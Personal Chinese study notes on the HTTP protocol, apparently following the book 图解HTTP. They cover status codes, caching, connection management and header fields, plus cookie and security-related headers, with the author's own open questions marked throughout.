# 图解HTTP（基本没有图😅）

## HTTP Method

### HEAD

### OPTIONS

### CONNECT

### TRACE

## Connection

持久连接，复用TCP连接，避免每个连接需要重新开启TCP连接、关闭TCP连接

### keep-alive

### close

## pipelining

管线化，并发请求

## Cookie

服务器返回一些用户状态，下次请求带上让服务器知道是谁

## Message & entity

报文与实体

- 报文（message）

  是HTTP通信中的基本单位，由8位组字节流（octet sequence，其中octet为8个比特）组成，通过HTTP通信传输

- 实体（entity）

  作为请求或响应的有效载荷数据（补充项）被传输，其内容由实体首部和实体主体组成

HTTP报文的主体用与传输请求或响应的实体主体

通常，报文主体等于实体主体。只有当传输中进行编码操作时，实体主体内容发生变化，才导致它和报文主体产生差异。<font color=red>？？？</font>

## Accept-encoding

压缩传输与内容编码

常用内容编码

1. gzip (GNU zip)
2. compress (UNIX 系统的标准压缩)
3. deflate (zlib)
4. identity (不进行编码)

## Chunk

分割发送的分块传输编码

把实体主体分块的功能称为分块传输编码 (Chucked Transfer Coding)

分块规则：每一块会用十六进制来标记块的大小，而实体主体的最后一块会使用“0（CR+LF）”来标记

## multiparty

多部分对象集合，常用在图片、视频或文本文件上传下载时

- multiparty/form-data

  Web表单文件上传

- multiparty/byteranges

  状态码206（Partial Content，部分内容）响应报文包含了多个范围的内容时使用

```
Content-Type: multipart/form-data; boundary=AaB03x

--AaB03x
Content-Disposition: form-data; name="field1"

Joe Blow
--AaB03x
Content-Disposition: form-data; name="pics"; filename="file1.txt"
Content-Type: text/plain

...(file.txt的数据)...
--AaB03x--
```

```
HTTP/1.1 206 Partial Content
Date: Fri, 13 Jul 2012 02:45:26 GMT
Last-Modified: Fri, 31 Aug 2007 02:02:20 GMT
Content-Type: multipart/byteranges; boundary=THIS_STRING_SEPARATES

--THIS_STRING_SEPARATES
Content-Type: application/pdf
Content-Range: bytes 500-999/8000

...（范围指定的数据）...
--THIS_STRING_SEPARATES
Content-Type: application/pdf
Content-Range: bytes 7000-7999/8000

...（范围指定的数据）...
--THIS_STRING_SEPARATES--
```

## Content Negotiation

内容协商

内容协商返回最合适的内容

- Accept
- Accept-Charset
- Accept-Encoding
- Accept-Language
- Content-Language

<font color=red>还有？？？</font>

- Content-Type
- Content-Encoding

一般请求头中的时Accept\*，响应头中的是Content\*

内容协商技术有以下3种：

1. 服务器驱动协商（Server-driven Negotiation）
2. 客户端驱动协商（Agent-driven Negotiation）
3. 透明协商（Transparent Negotiation）

## HTTP 状态码

1XX Informational（信息性状态码）

|      | 类别                             | 原因短语                   |
| ---- | -------------------------------- | -------------------------- |
| 1XX  | Informational （信息性状态码）   | 接受的请求正在处理         |
| 2XX  | Success（成功状态码）            | 请求正常处理完毕           |
| 3XX  | Redirection（重定向状态码）      | 需要进行附加操作以完成请求 |
| 4XX  | Client Error（客户端错误状态码） | 服务器无法处理请求         |
| 5XX  | Server Error（服务器错误状态码） | 服务器处理请求出错         |

### 2XX

- 200 OK
- 204 No Content
- 206 Partial Content

### 3XX

- 301 Moved Permanently 永久性重定向
- 302 Found 临时性重定向 原始规范，不能改变方法，但是许多公司是以303的形式实现的（基本都把POST改为GET）
- 303 See Other 临时性重定向 可以变方法，但只能变成GET
- 304 Not Modified 缓存
- 307 Temporary Redirect 临时性重定向 是 302 的细分（302 分为 303 307）请求方法不能变

### 4XX

- 400 Bad Request
- 401 Unauthorized
- 403 Forbidden
- 404 Not Found

### 5XX

- 500 Internal Server Error
- 503 Service Unavailable

## Web Server

Web 服务器，可以用来干什么？

用单台虚拟主机实现多个域名

### Proxy、GateWay、Tunnel

通信数据转发程序：代理、网关、隧道

除客户端和服务器外，还有一些用于通信数据转发的应用程序，如：代理、网关和隧道。

这些应用程序和服务器可以将请求转发给通信线路上的下一站服务器，并且能接受从那台服务器发送的响应再转发给客户端。

- 代理（Nginx、HTTP的、缓存、是否透明、Via）

  一种有转发功能的应用程序，中间人角色

  转发、不改变请求URL

  Via 首部信息

  理由：

  - 利用缓存技术减少网络带宽的流量
  - 组织内部针对特定网站的访问控制，
  - 获取访问日志

  使用方法：有多种使用方法，按两种基准分类。一种是是否使用了缓存，另一种是是否会修改报文

  - 缓存代理

    代理转发响应时，缓存代理（Caching Proxy）会预先将资源的副本（缓存）保存在代理服务器上。

    当代理再次接受到缓存的资源请求时，就可以直接将缓存返回。

  - 透明代理

    转发请求或响应时，不对报文做任何加工的代理类型被称为透明代理（Transparent Proxy）。反之，称为非透明代理。

- 网关（协议转换、非HTTP、多种系统对接联动）

  转发其他服务器通信数据的服务器，接收从客户端发送过来的请求时，它就像自己拥有资源的服务器一样对请求进行处理。有时客户端可能都不会察觉，自己的通信目标是一个网关。

  可以利用网关将HTTP请求转化为其他通信协议

  与代理十分类似，但是网关可以提供非HTTP服务协议。

  利用网关能提高通信的安全性，因为可以在客户端与网关之间的通信线路上加密以确保连接的安全。比如，网关可以连接数据库，使用SQL语句查询通信。另外，在Web购物网站上进行信用卡结算时，网关可以和信用卡结算系统联动。

- 隧道（SSL、远距离安全通信）

  相隔甚远的客户端和服务器之间进行中转，并保持双方通信连接的应用程序。

  隧道可按照要求建立起一条与其他服务器的通信线路，届时使用SSL等加密手段进行通信。

  隧道的目的是确保客户端能与服务器进行安全的通信。

  隧道本身不会去解析HTTP请求。保持原样中转

### Cache Server

缓存服务器，保存资源的缓存。是代理服务器的一种（缓存代理），在转发服务器的内容时，会缓存一份。

缓存有效期（服务器会返回一些首部信息）

客户端的缓存（网络临时文件）<font color=red>有硬盘的，也有内存的？？？</font>

## HTTP Header

HTTP 首部

### 结构

#### 请求报文

#### 响应报文

### 首部字段

#### 结构

#### 类型

4种

1. 通用首部字段（General Header Fields）
2. 请求首部字段（Request Header Fields）
3. 响应首部字段（Response Header Fields）
4. 实体首部字段（Entity Header Fields）

### HTTP/1.1 首部字段一览

HTTP/1.1 规范定义了如下 <font color=red>47</font> 种首部字段（RFC2616）

- 通用首部字段：

| 首部字段名        | 说明                                                         |
| ----------------- | ------------------------------------------------------------ |
| Cache-Control     | 控制缓存的行为                                               |
| Connection        | 逐跳首部、连接的管理                                         |
| Date              | 创建报文的日期时间                                           |
| Pragma            | 报文指令                                                     |
| Trailer           | 报文末端的首部一览                                           |
| Transfer-Encoding | 指定报文主体的传输编码方式                                   |
| Upgrade           | 升级为其他协议（<font color=red>Websocket好像有这个字段，是HTTP协议的升级？？？</font>） |
| Via               | 代理服务器的相关信息                                         |
| Warning           | 错误通知                                                     |

- 请求首部字段：

| 首部字段名          | 说明                                              |
| ------------------- | ------------------------------------------------- |
| Accept              | 用户代理可处理的媒体类型                          |
| Accept-Charset      | 优先的字符集                                      |
| Accept-Encoding     | 优先的内容编码                                    |
| Accept-Language     | 优先的语言（自然语言）                            |
| Authorization       | Web认证信息                                       |
| Expect              | 期待服务器的特定行为                              |
| From                | 用户的电子邮箱地址                                |
| Host                | 请求资源所在服务器                                |
| If-Match            | 比较实体标记（ETag）                              |
| If-Modified-Since   | 比较资源的更新时间                                |
| If-None-Match       | 比较实体标记（与If-Match相反）                    |
| If-Range            | 资源未更新时发送实体Byte的范围请求                |
| If-Unmodified-Since | 比较资源的更新时间（与If-Modified-Since相反）     |
| Max-Forwards        | 最大传输逐跳数                                    |
| Proxy-Authorization | 代理服务器要求客户端的认证信息                    |
| Range               | 实体的字节请求范围                                |
| Referer             | 对请求中URI的原始获取方<font color=red>???</font> |
| TE                  | 传输编码的优先级                                  |
| User-Agent          | HTTP客户端程序的信息                              |

- 响应首部字段：

| 首部字段名         | 说明                                                         |
| ------------------ | ------------------------------------------------------------ |
| Accept-Range       | 是否接受字节范围请求                                         |
| Age                | 推算资源创建经过时间                                         |
| ETag               | 资源的匹配信息                                               |
| Location           | 令客户端重定向至指定URI                                      |
| Proxy-Authenticate | 代理服务器对客户端的认证信息<font color=red>与Proxy-Authorization怎么配合？？？</font> |
| Retry-After        | 对再次发起请求的时机要求                                     |
| Server             | HTTP服务器的安装信息                                         |
| Vary               | 代理服务器缓存的管理信息                                     |
| WWW-Authenticate   | 服务器对客户端的认证信息                                     |

- 实体首部字段：

| 首部字段名       | 说明                         |
| ---------------- | ---------------------------- |
| Allow            | 资源可支持的HTTP方法         |
| Content-Encoding | 实体主体适用的编码方式       |
| Content-Language | 实体主体的自然语言           |
| Content-Length   | 实体主体的大小（单位：字节） |
| Content-Location | 替代对应资源的URI            |
| Content-MD5      | 实体主体的报文摘要           |
| Content-Range    | 实体主体的位置范围           |
| Content-Type     | 实体主体的媒体类型           |
| Expires          | 实体主体过期的日期时间       |
| Last-Modified    | 资源最后修改日期时间         |

### 非HTTP/1.1 首部字段

除了 RFC2616 定义的47种首部字段外，还有<font color=gold>Cookie、Set-Cookie和DContent-Disposition等</font>在其他RFC中定义的首部字段，使用频率也很高。

这些非正式的首部字段统一归纳在<font color=gold>RFC4229 HTTP Header Field Registrations</font>中。

### End-to-end 首部 和 Hop-by-hop 首部

- 端到端首部（End-to-end Header）

  此类首部会转发给请求/响应的最终目标

- 逐跳首部（Hop-by-hop Header）

  此类首部只对单次转发有效，会因通过缓存或代理而不再转发。如果要使用Hop-by-hop，需要提供<font color=orange>Connection</font>首部字段。

  HTTP/1.1中<font color=red>8</font>个逐跳首部字段：

  1. Connection
  2. Keep-Alive
  3. Proxy-Authenticate
  4. Proxy-Authorization
  5. Trailer
  6. TE
  7. Transfer-Encoding
  8. Upgrade

  除此之外，都是端到端首部。

## 通用首部

### Cache-Control

```
Cache-Control: private, max-age=0, no-cache
```

缓存请求指令

| 指令                 | 参数   | 说明                         |
| -------------------- | ------ | ---------------------------- |
| no-cache             | 无     | 强制向源服务器再次验证       |
| no-store             | 无     | 不缓存请求或响应的任何内容   |
| max-age = [ 秒]      | 必需   | 响应的最大Age值              |
| max-stable( = [ 秒]) | 可省略 | 接收已过期的响应             |
| min-fresh = [ 秒]    | 必需   | 期望在指定时间内的响应仍有效 |
| no-transform         | 无     | 代理不可更改媒体类型         |
| only-if-cached       | 无     | 从缓存获取资源               |
| Cache-extension      | -      | 新指令标记（token）          |

缓存响应指令：

| 指令             | 参数   | 说明                                           |
| ---------------- | ------ | ---------------------------------------------- |
| public           | 无     | 可向任意放提供响应的缓存                       |
| private          | 无     | 仅向特定用户返回响应                           |
| no-cache         | 可省略 | 缓存前必须先确认其有效性                       |
| no-store         | 无     | 不缓存请求或响应的任何内容                     |
| no-transform     | 无     | 代理不可更改媒体类型                           |
| must-revalidate  | 无     | 可缓存但必须再向源服务器进行确认               |
| proxy-revalidate | 无     | 要求中间缓存服务器对缓存的响应有效性再进行确认 |
| max-age = [ 秒]  | 必需   | 响应的最大Age值                                |
| s-maxage = [ 秒] | 必需   | 公共缓存服务器响应的最大Age值                  |
| cache-extension  | -      | 新指令标记（token）                            |



#### public & private

#### no-cache & no-store

no-cache 防止从过期的缓存中返回过期资源

客户端发送的请求中包含no-cache指令，表示客户端将不会接受缓存过的响应。于是，代理服务器必须把客户端请求转发给源服务器。

服务器返回的响应中包含no-cache指令，缓存服务器不能对资源缓存。源服务器以后也不会对缓存服务器请求中提出的资源有效性进行确认。

#### max-age & s-maxage & min-fresh & max-stale

s-maxage 指令的功能和 max-age 指令相同，不同点是：<font color=red>s-maxage指令只适用于供多位用户使用的公共缓存服务器 </font>。也就是说，对于向同一用户重复返回响应的服务器来说，该指令是无任何作用的。另外，s-maxage 的优先级 高于 Expires 和 max-age

max-age

min-fresh （这缓存再过60秒还算是新的吗？）要求缓存服务器返回至少还未过指定时间的缓存资源。

max-stale 可指示缓存资源，即使过期也照常接收。

- 无参数，无论经过多久，都接收
- 有参数，即使过期，但在max-stale指定的时间内，仍接收。

#### must-revalidate & proxy-revalidate

must-revalidate 必须向源服务器验证（代理服务器向源服务器）

proxy-revalidate 缓存服务器必须验证（代理服务器自身）

### Connection

两个作用

- 控制不在转发给代理服务器的首部字段
- 管理持久连接

#### 控制不再转发给代理的首部字段

```
请求
GET / HTTP/1.1
Upgrade: HTTP/1.1
Connection: Upgrade

转发
GET / HTTP/1.1
```

把配置的首部字段 删除后再转发（Hop-by-hop 首部）

```
Connection: 不再转发的首部字段名
```

#### 管理持久连接

HTTP/1.1 版本的连接默认都是持久连接的。如果你明确需要断开连接，请设置为 close

```
Connection: close

Connection: Keep-Alive

请求
GET / HTTP/1.1
Connection: Keep-Alive

响应
HTTP/1.1 200 OK
...
Keep-Alive: timeout=10, max=500
Connection: Keep-Alive
```

### Transfer-Encoding

规定了传输<font color=red>报文主体</font>时采用的编码方式。

HTTP/1.1的传输编码方式仅对分块传输编码有效。

```
HTTP/1.1 200 OK
Date: Tue, 03 Jul 2012 04:40:56 GMT
Cache-Control: public, max-age=604800
Content-Type: text/javascript; charset=utf-8
Expires: Tue, 10 Jul 2012 04:40:56 GMT
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Content-Encoding: gzip
Transfer-Encoding: chunked
Connection: keep-alive

cf0		👈16进制（10进制为3312）
..3312字节分块数据...
392		👈16进制（10进制为914）
...914字节分块数据...
0
```

### Upgrade

用于检测HTTP协议及其他协议是否可使用更高的版本进行通信，其参数值可以用来指定一个完全不同的通信协议

```
请求
GET /index.htm HTTP/1.1
Upgrade: TLS/1.0
Connection: Upgrade

响应
HTTP/1.1 101 Switching Protocols
Upgrade: TLS/1.0, HTTP/1.1
Connection: Upgrade
```

👆用例中，首部字段Upgrade指定TLS/1.0

Connection指定为Upgrade

<font color=gold>没弄懂：Upgrade首部字段产生作用的Upgrade对象仅限于客户端和邻接服务器之间。因此使用首部字段时，还需要额外指定Connection: Upgrade</font>

Connection 不是不再转发了吗？👆不用转发？似乎真是这样，应为代理服务器会过滤掉，所以在配置nginx代理websocket时：需要带上如下👇

![image-20221208131532506](./assets/image-20221208131532506.png)

### Via

追踪客户端与服务器之间的请求和响应报文的传输路径

经过代理或网关时，会先在首部字段Via中附加该服务器的信息，然后再进行转发。这个做法和traceroute和电邮的Received首部的工作机制很类似。

<font color=gree>Via不仅用于追踪报文的转发，还可以避免请求回环的发生</font>

所以：**经过代理时必须加Via**

```
请求
GET / HTTP/1.1

代理A
GET / HTTP/1.1
Via: 1.0 gw.hackr.jp(Squid/3.1)

代理B
GET / HTTP/1.1
Via: 1.0 gw.hackr.jp(Squid/3.1), 
1.1 a1.example.com(Squid/2.7)

源服务器
```

Via是为了追踪传输路径，所以经常和 TRACE 方法一起使用。

比如：代理服务器接收到由 TRACE 方法发送过来的请求（其中Max-Forwards: 0）时，代理服务器就不能再转发该请求了。这种情况下，代理服务器会将自身的信息附加到Via首部后，返回该请求的响应。<font color=red>（所以Via是通用首部）</font>

## 请求首部

### Accept

```
Accept: text/html,application/xhtml+xml,application/xml;q=0.9

👇
text/html;q=1
application/xhtml+xml;q=1
application/xml;q=0.9
```

通知服务器，用户代理能够处理的<font color=red>媒体类型</font>及优先级。type/subtype形式

常见媒体类型：

- 文本文件

  text/html, text/plain, text/css...

  application/xhtml+xml, application/xml...

- 图片文件

  image/jpeg, image/gif, image/png...

- 视频文件

  video/mpeg, video/quicktime...

- 应用程序使用的二进制文件

  application/octet-stream, application/zip...

<font color=red>优先级</font>：q=(0~1); 分号分割 （品质系数：qvalue quality factor）q的范围是0～1（可精确到小数点后三位），不指定权重时默认q=1.0

<font color=gold>这里的权重是相对的，其具体数值没有多大意义？只用于排序比较？？？q=0.8;q=0.2 和 q=0.55;q=0.45 没有实质区别？？？</font>

服务器处理：当服务器提供多种内容时，将会优先返回权重高的媒体类型

### Accept-Charset

```
Accept-Charset: iso-8859-5, unicode-1-1;q=0.8

👇
iso-8859-5;q=1
unicod-1-1;q=0.8

还是👇
iso-8859-5;q=0.8
unicod-1-1;q=0.8
```

<font color=red>字符集</font>及优先级权重

### Accept-Encoding & TE

#### Accept-Encoding

```
Accept-Encoding: gzip, deflate

TE: gzip, deflate; q=0.5

👇
gzip;q=1
deflate;q=0.5

还是👇
gzip;q=0.5
deflate;q=0.5
```

```
TE: trailers
```

Accept-Encoding用来告知服务器用户代理支持的<font color=red>内容编码</font>（理解为压缩算法）及优先级

常见内容编码：

- gzip

  由文件压缩程序gzip（GNU zip）生成的编码格式（RFC1952），采用Lempel-Ziv苏烦啊（LZ77）及32位循环冗余校验（Cyclic Redundancy Check，通称CRC）

- compress

  由UNIX文件压缩程序compress生成的编码格式，采用Lempel-Ziv-Welch算法（LZW）

- deflate

  组合使用zlib格式（RFC1950）及由deflate压缩算法（RFC1951）生成的编码格式

- identity

  不执行压缩或不会变化的默认编码格式

q值与👆的一样，也可以使用*作为通配符，指定任意的编码格式

#### TE

```
TE: gzip, deflate;q=0.5
```

TE会告知服务器客户端能够处理响应的<font color=red>传输编码</font>方式及相对优先级，与Accept-Encoding很像，但用于传输编码。

<font color=orange>TE其实和Transer-Encoding有大的关系？？？</font>

https://blog.csdn.net/weixin_39843989/article/details/101225414

- 内容编码时在传输前进行的，一般是为了对实体主体进行压缩
- 传输编码是在传输过程中进行编码，在内容编码的基础上，可以继续对实体主体进行传输编码，使其可以分块传输，也可以不进行分块传输编码直接一次性进行完整传输

TE除指定传输编码之外，还可以指定伴随trailer字段的分块传输编码的方式。应用后者时，只需把trailers赋值给改字段值。

https://www.zhihu.com/question/346022586

```
TE: trailers
```

### Accept-Language

```
Accept-Language: zh-cn,zh;q=0.7,en-us,en;q=0.3

👇
zh-cn;q=1
zh;q=0.7
en-us;q=1 🤔️
en;q=0.3

还是👇
zh-cn;q=0.7
zh;q=0.7
en-us;q=0.3 🤔️
en;q=0.3
```

<font color=red>自然语言</font>及优先级

### Authorization & Proxy-Authorization

```
Authorization Basic dWVub3N1bjpwYXNzd29yZA==

Authorization Bearer fc9bf5d7548ac2dfa56ad37735c8ce96
```

Authorization首部字段用以告知服务器，用户代理的认证信息（证书值）。

有关HTTP访问认证及Authorization首部字段，稍后的章节还会详细书评。可以参阅RFC2616

Proxy-Authorization 

接收从代理服务器发来的请求质询时（Proxy-Authenticate），客户端会发送包Proxy-Authorization首部，告知代理服务器所需的信息。

与客户端和服务器之间的HTTP访问认证是类似的。（HTTP访问认证，后面章节会详细说明）

### If-Match & If-None-Match

都是与服务器返回的响应ETag配对

形如If-xxx这种样式的请求首部，都可称为<font color=red>条件请求</font>。服务器接收到附带条件后，只有判断条件为真时，才会执行请求。

- If-Math
- If-Modified-Since
- If-None-Math
- If-Range
- If-Unmodified-Since

服务器会对比If-Match的字段值和资源的ETag值，当一致时，才执行请求。反之，则返回状态码412 Precondition Failed的响应。

If-None-Match 与ETag值一致时返回304，不一致 才执行请求。

### If-Modified-Since & If-Unmodified-Since

都是与服务器返回的响应Last-Modifed配对

If-Modified-Since 只有资源的修改日期发生变化，才执行请求，否则返回304

If-Unmodified-Since 只有资源修改日期未发生变化，才执行请求，否则返回412 Precondition Failed

### If-Range & Range

If-Range与服务器返回的ETag或者Last-Modified配对

If-Range字段如果跟ETag值或者更新的日期时间匹配一致，那么就作为范围请求处理。

```
发起请求
GET /index.html
If-Range: "123456"
Range: bytes=5001-10000

匹配一致，执行范围请求
HTTP/1.1 206 Partical Content
Content-Range: bytes 5001-10000/10000
Content-Length: 5000

匹配不一致，忽略范围请求，返回去不资源，并带上ETag 或Last-Modified？？？
HTTP/1.1 200 OK
ETag: "567890"
```

如果不使用If-Range，如果不匹配则需要进行两次处理

```
发起请求
GET /index.html
If-Match: "123456"
Range: bytes=5001-10000

匹配不一致
HTTP/1.1 412 Precondition Failed

客户端再次发起请求
GET /index.html

HTTP/1.1 200 OK
ETag: "567890"
```

Range首部

```
Range: bytes=5001-10000/10000
```

### Max-Forwards

![image-20221210084821792](./assets/image-20221210084821792.png)

用于排查到底是哪台代理出了问题。

![image-20221210133056773](./assets/image-20221210133056773.png)

### Host & Referer

#### Host首部

```
Host: www.hackr.jp
```

虚拟主机运行在同一个IP上，需要用Host加一区分

会告知服务器，请求的资源所处的互联网主机名和端口。<font color=red>Host首部字段在HTTP/1.1规范内是唯一一个必须被包含在请求内的首部字段。</font>

Host和以<font color=red>单台服务器</font>分配<font color=red>多个域名的虚拟主机</font>的工作机制有很密切的关联，这就是Host必须存在的意义。

请求被发送至服务器时，请求中的主机名会用IP地址直接替换解决（DNS服务器的域名解析）。但如果这时，相同的IP下部署这多个域名，那么服务器就会无法理解究竟是哪个域名对应的请求。因此，就需要使用Host来明确指出请求的主机名。若服务器未设定主机名，那直接发送一个空值即可。

```
Host:
```

#### Referer的首部

```
Referer: http://www.hackr.jp/index.html
```

告知服务器请求的原始资源的URI

客户端一般都会发送Referer给服务器。

##### 目的

referer可以用来<font color=red>反爬虫，防盗链</font>，将地址直接在浏览器中打开不会携带referer，服务器可以验证referer来决定如何响应请求。

当直接冲浏览器输入地址时，Referer为空

出于安全考虑，Referer可以设置为空（<font color=red>怎么设置？？？</font>）因为原始URI可能包含ID和密码等信息

##### 设置

###### 方法一：统一设置，head中meta

```html
<meta name="referrer" content="never">
```

会得到

```
Referrer Policy: no-referrer
```

###### 方法二：单独设置，referrerPolicy属性

```html
<img src="xxxx.jpg"  referrerPolicy="no-referrer" />
```

###### 方法三：iframe rel属性

```html
<iframe src="auto-refresh.html" width="500" height="500" rel="noreferrer" />
```

###### 方法四：代理服务器拦截设置

先经过自己的代理服务器，在代理服务器中修改referer

Referer的正确拼写应该是Referrer，但大家习惯用Referer

## 响应首部

### Accept-Ranges

用以告知客户端该服务器是否支持范围请求

```
当不能处理范围请求时
Accept-Ranges: none

可处理范围请求时
Accept-Ranges: bytes
```

### Age

告知客户端，服务器在多久之前创建了响应。单位为秒。

若服务器时缓存服务器，Age值是指缓存后的响应再次发起认证到认证完成的时间值。代理创建响应时必须加上Age。

与Date：Date是创建请求时的时间，Age是推算响应话费的时间（单位为秒）

https://cloud.tencent.com/developer/section/1189902

Age header 包含以秒计的对象一直在代理缓存的时间。

Age header 通常接近0

如果是这样 Age: 0，它可能只是从原始服务器获取；

否则它通常是根据代理的当前日期和Date HTTP响应中包含的通用头部之间的差异来计算的。

### ETag

告知客户端实体标识，资源到字符串的摘要（可视为唯一映射）

资源更新，ETag也需要更新

#### 强ETag值

强ETag值，不论实体发生多么细微的变化都会改变其值

```
ETag: "usagi-1234"
```

#### 弱ETag值

弱ETag值只用于提示资源是否相同，只有资源发生了根本改变，产生差异时才会改变ETag值。这时，会在字段值最开始处附加W/

```
ETag: W/"usagi-1234"
```

### Location

```
GET /sample.htm

HTTP/1.1 302 Found
Location: http://www.usagidesign.jp/sample.htm
```

基本上，该字段会配合3xx: Redirection 的响应，提供重定向的URI

### Proxy-Authenticate & WWW-Authenticate

#### Proxy-Authenticate

```
Proxy-Authenticate: Basic realm="Usagidesign Auth"
```

Proxy-Authenticate会把代理服务器所要求的认证信息发送给客户端

#### WWW-Authenticate

```
WWW-Authenticate: Basic realm="Usagidesign Auth"
```

用于HTTP访问认证。会告知客户端适用于访问请求URI所指资源的认证方案（Basic或Digest）和带参数提示的质询（challenge）。状态码401 Unauthorized响应中，肯定带有WWW-Authenticate

上述示例中，realm字段的字符串是为了辨别请求URI指定资源所受到的保护策略。后面章节会详细介绍。

### Server

服务器的自我介绍

```
Server: Apache/2.2.17 (Unix)
Server: Apache/2.2.6 (Unix) PHP/5.2.5
```

### Vary

缓存相关，告知缓存服务器只能对某请求首部相同的内容进行缓存

![image-20221211195410211](./assets/image-20221211195410211.png)

```
Vary: Accept-Language
```

Accept-Language相同，才能缓存。否则，需要向源服务器请求。

## 实体首部

实体首部字段是包含在请求报文和响应报文中的实体部分所使用的首部，用于补充内容的更新时间等与实体相关的信息。

### Content-Encoding

```
Content-Encoding: gzip
```

告知对方实体主体选用的<font color=red>内容编码</font>方式。

主要有4中

1. gzip
2. compress
3. deflate
4. Identity

### Content-Language

```
Content-Language: zh-CN
```

### Content-Length

```
Content-Length: 15000
```

实体主体部分大小（单位字节）。对实体主体进行内容编码传输时，不能再使用Content-Length首部字段。

<font color=red>有时候必须指定Content-Length，不然客户端或服务器不知道响应或请求已经结束。有一篇笔记有讨论这个，并自己代码实现了服务器，找找看。</font>

### Content-Location

```
Content-Location: http://www.hackr.jp/index-ja.html
```

给出与报文主体部分相对应的URI。和首部字段Location不同，Content-Location表示的是报文主体返回资源对应的URI。

比如，对于受用首部字段Accept-Language的服务器驱动型请求，当返回的页面内容与实际请求的对象不同时，首部字段Content-Location内会写明URI（访问http://www.hackr.jp返回的对象却是http://www.hackr.jp/index-ja.html等类似情况）

Location指向重定向后的结果，Content-Location指向内容协商的协商结果

### Content-MD5

![image-20221211212403832](./assets/image-20221211212403832.png)

用于检验报文主体在传输过程中是否保持完整，以及确认传输到达。

对报文主体执行MD5算法获得的128位二进制数，再通过Base64编码后将结果写入Content

-MD5字段值。<font color=gold>由于HTTP首部无法记录二进制值，所以要通过Base64编码处理</font>。为确保报文的有效性，作为接收方的客户端会对报文主体再执行一次相同的MD5算法，计算出的值与字段值做比较后，即可判断出报文主体的准确性。

采用这种方法，对内容上的偶发性改变是<font color=red>无从查证</font>的，也无法检测出恶意篡改。其中一个原因在于，内容如果能够被篡改，那么同时意味着Contnet-MD5也可以重新计算然后被篡改。所以无法检测。

### Content-Range

```
HTTP/1.1 206 Partial Content
Date: Wed, 04 Jul 2012 07:28:03 GMT
Content-Range: bytes 5001-10000/10000
Content-Length: 5000
Content-Type: image/jpeg
```

范围请求

### Content-Type

```
Content-Type: text/html; charset=UTF-8
```

媒体类型，字符集

### Expires

```
Expires: Wed, 04 Jul 2012 07:28:03 GMT
```

缓存，缓存过期时间。用于客户端的强制缓存判断

源服务器如果不希望缓存服务器缓存资源，最好Expires与Date一致。

Expires优先级不如 Cache-Control(max-age)

### Last-Modified

```
Last-Modified: Wed, 04 Jul 2012 07:28:03 GMT
```

缓存，用于服务端的协商缓存判断

## Cookie相关

Cookie虽然没有被编入标准化HTTP/1.1的RFC2616中，但在Web网站方面得到了广泛应用。

Cookie的工作机制是用户识别以及状态管理。服务器写入，客户端请求带上。

调用Cookie时，由于可校验Cookie的有效期，以及发送方的域、路径、协议等信息，所以正规发布的Cookie内的数据不会因来自其他Web站点和攻击者的攻击而泄密。

| 首部字段名 | 说明                           | 首部类型     |
| ---------- | ------------------------------ | ------------ |
| Set-Cookie | 开始状态管理所使用的Cookie信息 | 响应首部字段 |
| Cookie     | 服务器接收到的Cookie信息       | 请求首部字段 |

### Set-Cookie

```
Set-Cookie: status=enable; expires=Tue, 05 Jul 2011 07:26:31 GMT; path=/; domain=.hackr.jp; 
```

| 属性         | 说明                                                         |
| ------------ | ------------------------------------------------------------ |
| NAME=VALUE   | 赋予Cookie的名称和其值（必需项）                             |
| expires=DATE | Cookie的有效期（若不明确指定则默认位浏览器关闭前为止）       |
| path=PATH    | 将服务器上的文件目录作为Cookie的适用对象（若不指定则默认为文档所在的文件目录） |
| domain=域名  | 作为Cookie适用对象的域名（若不指定则默认位创建Cookie的服务器的域名） |
| Secure       | 仅在HTTPS安全通信时才发送Cookie                              |
| HttpOnly     | 加以限制，使Cookie不能被JavaScript脚本访问                   |

#### expires

指定浏览器可发送Cookie的有效期

当省略时，有效期仅限于浏览器会话（Session）时间段内。通常限于浏览器被关闭前。（<font color=gold>是浏览器被关闭还是页签被关闭？？？</font>）

另外，一旦Cookie从服务器端发送到客户端，服务器端就不存在可以显示删除Cookie的方法。但可通过覆盖已过期的Cookie，实现对客户端Cookie的实质性删除操作。

#### domain

如果指定了example.com，*.example.com都可以发送Cookie。

如果不指定，就是必需匹配创建Cookie的服务器所在的域名。反而更加安全。

因此，除了针对具体指定的多个域名发送 Cookie 之 外，不指定 domain 属性显得更安全。 

#### secure

HTTPS连接时，才可以发送Cookie。

#### HttpOnly

时Cookie的扩展功能，它使js脚本无法获取Cookie。主要目的是防止<font color=red>跨站脚本攻击（Cross-site scripting, XSS）</font>对Cookie的信息窃取。

```
Set-Cookie: name=value; HttpOnly
```

通过上述设置，通常从Web页面内还可以对Cookie进行读取操作。但使用js的document.cookie就无法读取附加HttpOnly属性后的Cookie的内容了。

### Cookie

```
Cookie: name=value
```

## 其他首部

首部可以自行扩展，所以在浏览器和Web服务器的应用上，会出现各种非标准的首部字段。

一些常用的：

- X-Frame-Options
- X-XSS-Protection
- DNT
- P3P

### X-Frame-Options

```
X-Frame-Options: DENY
```

属于响应首部，用于控制网站内容在其他Web网站的Frame标签页内的显示问题。其主要目的是为了防止<font color=red>点击劫持（clickjacking）</font>攻击。

有两个可指定的字段值：

1. DENY: 拒绝
2. SAMEORIGIN: 仅同源域名下的页面（Top-level-browsing-context）匹配时许可。

apache2.conf配置

```xml
<IfModule mod_headers.c>
	Headerr append X-FRAME-OPTIONS "SAMEORIGIN"
</IfModule>
```

### X-XSS-Protection

```
X-XSS-Protection: 1
```

属于响应首部，针对<font color=red>跨域脚本攻击（XSS）</font>，用于控制浏览器XSS防护机制的开关。

有两个可指定的字段值：

1. 0: 将XSS过滤设置成无效状态
2. 1: 将XSS过滤设置成有效状态

### DNT

```
DNT: 1
```

属于请求首部，时Do Not Track的简称，意味拒绝个人信息被收集，时表示拒绝被精准广告追踪的一种方法。

有两个可以指定的字段值：

1. 0: 同意被追踪
2. 1: 拒绝被追踪

浏览器支持了还不够，Web服务器还需要对其支持。

### P3P

```
P3P: CP="CAO DSP LAW CURa ADMa DEVa TAIa PSAa PSDa IVAa IVDa OUR BUS I
```

属于响应首部，通过利用P3P（The Platform for Privacy Preferences，在线隐私偏好平台）技术，可以让Web网站上的个人隐私变成一种仅供程序可理解的形式，以达到保护用户隐私的目的。

要进行P3P的设定，需按以下操作步骤进行。

1. 创建P3P隐私
2. 创建P3P隐私对照文件后，保存命名在/w3c/p3p.xml
3. 从P3P隐私中新建Compact policies后，输出到HTTP响应中

## 首部总结

- Cache

  - ETag 响应首部

  - Expires和Last-Modified 实体首部

